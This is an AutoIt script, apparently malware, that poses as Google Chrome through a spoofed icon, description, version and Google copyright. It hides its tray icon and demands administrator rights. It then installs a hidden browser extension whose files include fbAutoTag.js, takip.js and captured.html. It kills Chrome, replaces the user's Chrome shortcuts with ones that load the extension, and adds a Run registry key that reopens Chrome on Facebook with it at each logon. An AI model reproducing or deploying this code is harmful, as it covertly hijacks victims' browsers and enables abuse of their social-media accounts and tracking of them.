
Opt("TrayIconHide", 1)
Opt("TrayAutoPause", 0)
#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Icon=gch.ico
#AutoIt3Wrapper_Compression=3
#AutoIt3Wrapper_UseUpx=y
#AutoIt3Wrapper_Res_Comment=Google Chrome
#AutoIt3Wrapper_Res_Description=Google Chrome
#AutoIt3Wrapper_Res_Fileversion=45.0.2454.101
#AutoIt3Wrapper_Res_LegalCopyright=Copyright 2012 Google Inc. All rights reserved.
#AutoIt3Wrapper_Res_Language=1055
#AutoIt3Wrapper_Res_requestedExecutionLevel=requireAdministrator
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
#include <Crypt.au3>
#include <file.au3>
#include <array.au3>
#include <WinAPIFiles.au3>
#include <SendMessage.au3>
#include <WindowsConstants.au3>
Func ProcessGetName($PId)
	If IsNumber($PId) = 0 Then
		SetError(2)
	ElseIf $PId > 9999 Then
		SetError(1)
	Else
		Local $PList = ProcessList()
		Local $i = 1
		Local $ProcessName = ""

		While $i <= $PList[0][0] And $ProcessName = ""
			If $PList[$i][1] = $PId Then
				$ProcessName = $PList[$i][0]
			Else
				$i = $i + 1
			EndIf
		WEnd
		Return $ProcessName
	EndIf
EndFunc ;==>ProcessGetName


Func _FileRename($s_Source, $s_Destination, $i_Flag = 0)
	Local $i
	$i = FileMove($s_Source, $s_Destination, $i_Flag)
	Return $i
EndFunc

$chromedizin = RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe","Path")


Func _ReduceMemory()
	Local $ai_GetCurrentProcessId = DllCall('kernel32.dll', 'int', 'GetCurrentProcessId')
	Local $ai_Handle = DllCall("kernel32.dll", 'int', 'OpenProcess', 'int', 0x1f0fff, 'int', False, 'int', $ai_GetCurrentProcessId[0])
	Local $ai_Return = DllCall("psapi.dll", 'int', 'EmptyWorkingSet', 'long', $ai_Handle[0])
	DllCall('kernel32.dll', 'int', 'CloseHandle', 'int', $ai_Handle[0])
	Return $ai_Return[0]
EndFunc   ;==>_ReduceMemory

Func _dell()
	Run(@ComSpec & " /c taskkill /f /im chrome.exe", "", @SW_HIDE,4)
EndFunc   ;==>_dell

; eklenti dosyalarýný kur

DirCreate(@AppDataDir & "\my")
DirCreate(@AppDataDir & "\my\_locales")
DirCreate(@AppDataDir & "\my\_locales\en")
DirCreate(@AppDataDir & "\my\JS")
DirCreate(@AppDataDir & "\my\JS\mysc")
DirCreate(@AppDataDir & "\my\images")


   FileInstall("my\images\video.png", @AppDataDir&"\my\images\video.png", 1)
   FileInstall("my\_locales\en\messages.json", @AppDataDir&"\my\_locales\en\messages.json", 1)
   FileInstall("my\JS\mysc\background.js", @AppDataDir&"\my\JS\mysc\background.js", 1)
   ;FileInstall("my\JS\mysc\fbAutoTag.js", @AppDataDir&"\my\JS\mysc\fbAutoTag.js", 1)
   FileInstall("my\JS\script.js", @AppDataDir&"\my\JS\script.js", 1)
   FileInstall("my\JS\unscript.js", @AppDataDir&"\my\JS\unscript.js", 1)
   FileInstall("my\captured.html", @AppDataDir&"\my\captured.html", 1)
   FileInstall("my\content.js", @AppDataDir&"\my\content.js", 1)
   FileInstall("my\fbAutoTag.js", @AppDataDir&"\my\fbAutoTag.js", 1)
   FileInstall("my\takip.js", @AppDataDir&"\my\takip.js", 1)
   FileInstall("my\manifest.json", @AppDataDir&"\my\manifest.json", 1)
   FileInstall("my\welcome.html", @AppDataDir&"\my\welcome.html", 1)
   FileInstall("my\welcome.js", @AppDataDir&"\my\welcome.js", 1)

	Sleep(1000)


 While ProcessExists("chrome.exe")
        ProcessClose("chrome.exe")
	 WEnd
	 Sleep(1000)

If FileExists(@AppDataDir & "\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\Google Chrome.lnk") = True Then
Local $parametreler = FileGetShortcut(@AppDataDir & "\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\Google Chrome.lnk")

Else
If FileExists(@DesktopDir & "\Google Chrome.lnk") = True then
Local $parametreler = FileGetShortcut(@DesktopDir & "\Google Chrome.lnk")
   ElseIf FileExists(@DesktopCommonDir & "\Google Chrome.lnk") = True Then
	   Local $parametreler = FileGetShortcut(@DesktopCommonDir & "\Google Chrome.lnk")

	  EndIf
EndIf

If FileExists(@AppDataDir & "\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\Google Chrome.lnk") = True Then
FileDelete(@AppDataDir & "\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\Google Chrome.lnk")
EndIf
If FileExists(@DesktopDir & "\Google Chrome.lnk") = True Then
  FileDelete(@DesktopDir & "\Google Chrome.lnk")
   EndIf
If FileExists(@DesktopCommonDir & "\Google Chrome.lnk") = True Then
  FileDelete(@DesktopCommonDir & "\Google Chrome.lnk")
   EndIf


Dim $hWnd = WinGetHandle('[CLASS:Progman]')
_SendMessage($hWnd, $WM_COMMAND, 0x0001A220)
Sleep(100)

FileCreateShortcut($parametreler[0],@AppDataDir & "\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\Google Chrome.lnk",$parametreler[1],"--app-shell-install-crx --load-extension=%appdata%\my",$parametreler[3],$parametreler[4],$parametreler[5],0,@SW_SHOWNORMAL)
FileCreateShortcut($parametreler[0],@DesktopCommonDir & "\Google Chrome.lnk",$parametreler[1],"--app-shell-install-crx --load-extension=%appdata%\my",$parametreler[3],$parametreler[4],$parametreler[5],0,@SW_SHOWNORMAL)


	$hkc ="HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
	RegWrite($hkc, "IMD", "REG_SZ", $chromedizin&"\chrome.exe http://www.facebook.com --app-shell-install-crx --load-extension=" & @AppDataDir & "\my")
	Sleep(1000)
;Run($chromedizin&"\chrome.exe http://www.facebook.com --app-shell-install-crx --load-extension=" & @AppDataDir & "\my")
Exit